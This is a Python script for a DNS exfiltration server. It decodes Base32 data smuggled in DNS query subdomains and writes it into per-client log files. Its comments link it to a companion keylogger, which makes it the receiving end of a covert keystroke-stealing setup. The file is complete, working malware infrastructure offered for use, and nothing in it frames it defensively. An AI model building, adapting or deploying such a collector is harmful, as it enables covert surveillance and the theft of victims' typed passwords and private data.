#!/usr/bin/env python3
"""
DNS exfiltration server for domain
Receives A queries, decodes Base32, reconstructs logs per client and session.
Filters allowed CLIENT_IDs to ignore noise from unrelated queries.
"""

import socket
import struct
import base64
import threading
import time
from datetime import datetime
from collections import defaultdict

EXFIL_DOMAIN = ""                    # your NS-delegated subdomain same as in keylogger.py
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 53

# --- Allowed client IDs (set your own IDs here) ---
ALLOWED_CLIENTS = {0, 100}       # Replace with actual IDs used in your keyloggers

# sessions structure: key=(client_id, session_id) -> {'chunks': dict, 'last_update': time}
sessions = defaultdict(lambda: {'chunks': {}, 'last_update': time.time()})

def build_dns_response(transaction_id, query_domain):
    """Build a DNS A response pointing to 127.0.0.1."""
    flags = 0x8180   # QR=1, RA=1
    header = struct.pack("!HHHHHH", transaction_id, flags, 1, 1, 0, 0)
    qname = b""
    for label in query_domain.split("."):
        qname += bytes([len(label)]) + label.encode()
    qname += b"\x00"
    question = qname + struct.pack("!HH", 1, 1)  # A, IN
    answer = struct.pack("!HHHLH4s", 0xC00C, 1, 1, 60, 4, socket.inet_aton("127.0.0.1"))
    return header + question + answer

def process_query(data, addr, sock):
    if len(data) < 12:
        return
    transaction_id = struct.unpack("!H", data[:2])[0]
    flags = struct.unpack("!H", data[2:4])[0]
    if (flags >> 15) & 1:
        return
    offset = 12
    domain_parts = []
    while True:
        if offset >= len(data):
            break
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            offset += 2
            break
        offset += 1
        domain_parts.append(data[offset:offset+length].decode())
        offset += length
    full_domain = ".".join(domain_parts)
    if not full_domain.endswith("." + EXFIL_DOMAIN):
        return
    subdomain = full_domain[:-(len(EXFIL_DOMAIN)+1)]
    encoded = subdomain.replace(".", "")
    try:
        padding = 8 - (len(encoded) % 8)
        if padding != 8:
            encoded += "=" * padding
        decoded = base64.b32decode(encoded)
    except Exception:
        return
    if len(decoded) < 4:
        return
    client_id = (decoded[0] << 8) | decoded[1]

    # --- FILTER: ignore unknown client IDs ---
    if client_id not in ALLOWED_CLIENTS:
        # Optionally log a message (disabled by default to reduce noise)
        # print(f"[-] Rejected query from unknown client {client_id}")
        return

    session_id = decoded[2]
    seq = decoded[3]
    chunk = decoded[4:]
    key = (client_id, session_id)
    sess = sessions[key]
    sess['chunks'][seq] = chunk
    sess['last_update'] = time.time()
    response = build_dns_response(transaction_id, full_domain)
    sock.sendto(response, addr)
    print(f"[*] Client {client_id}, session {session_id}, seq={seq}, size={len(chunk)} B")

def finalize_old_sessions():
    now = time.time()
    timeout = 2.0
    to_remove = []
    for (client_id, session_id), sess in sessions.items():
        if now - sess['last_update'] > timeout and sess['chunks']:
            sorted_data = [sess['chunks'][s] for s in sorted(sess['chunks'].keys())]
            full_data = b"".join(sorted_data).decode("utf-8", errors="replace")
            filename = f"client_{client_id}.log"
            with open(filename, "a", encoding="utf-8") as f:
                f.write(f"\n--- Client {client_id}, session {session_id} ({datetime.now().isoformat()}) ---\n")
                f.write(full_data)
            print(f"[+] Saved client {client_id}, session {session_id} to {filename} ({len(full_data)} chars)")
            to_remove.append((client_id, session_id))
    for key in to_remove:
        del sessions[key]

def session_cleaner():
    while True:
        time.sleep(1)
        finalize_old_sessions()

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN_IP, LISTEN_PORT))
    print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT}/UDP for *.{EXFIL_DOMAIN}")
    print(f"[*] Allowed client IDs: {ALLOWED_CLIENTS}")
    cleaner = threading.Thread(target=session_cleaner, daemon=True)
    cleaner.start()
    while True:
        data, addr = sock.recvfrom(4096)
        threading.Thread(target=process_query, args=(data, addr, sock), daemon=True).start()

if __name__ == "__main__":
    main()